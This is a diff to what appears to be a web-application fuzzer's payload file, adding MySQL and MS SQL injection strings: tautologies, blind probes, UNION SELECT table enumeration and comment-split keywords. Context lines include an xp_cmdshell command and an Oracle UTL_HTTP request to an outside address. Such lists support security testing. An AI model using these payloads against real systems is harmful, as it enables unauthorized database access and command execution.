@@ -118,6 +118,34 @@ x' OR full_name LIKE '%Bob%
 23 OR 1=1; --
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 
+P:MY1-SQL-INJ:mySQL Injection 101:4
+> Replacive Fuzzers | SQL Injection | Injection
+A
+1 OR 1=1
+1' OR '1'='1
+1 AND USER_NAME() = 'dbo'
+
+
+P:MY2-SQL-INJ:mySQL Injection (Blind):5
+> Replacive Fuzzers | SQL Injection | Injection
+1
+1'1
+1 EXEC SP_ (or EXEC XP_)
+1 AND 1=1
+1' AND 1=(SELECT COUNT(*) FROM tablenames); --
+
+P:MY3-SQL-MS3:mySQL/MS SQL Common Injection:9
+> Replacive Fuzzers | SQL Injection | Injection
+1
+1 AND USER_NAME() = 'dbo'
+\'; DESC users; --
+1\'1
+1' AND non_existant_table = '1
+' OR username IS NOT NULL OR username = '
+1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116
+1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --
+1 UNI/**/ON SELECT ALL FROM WHERE
+
 P:SQL-ORA-CLE:Oracle SQL Injection:2
 > Replacive Fuzzers | SQL Injection | Injection
 '||UTL_HTTP.REQUEST('http://192.168.1.1/')||'
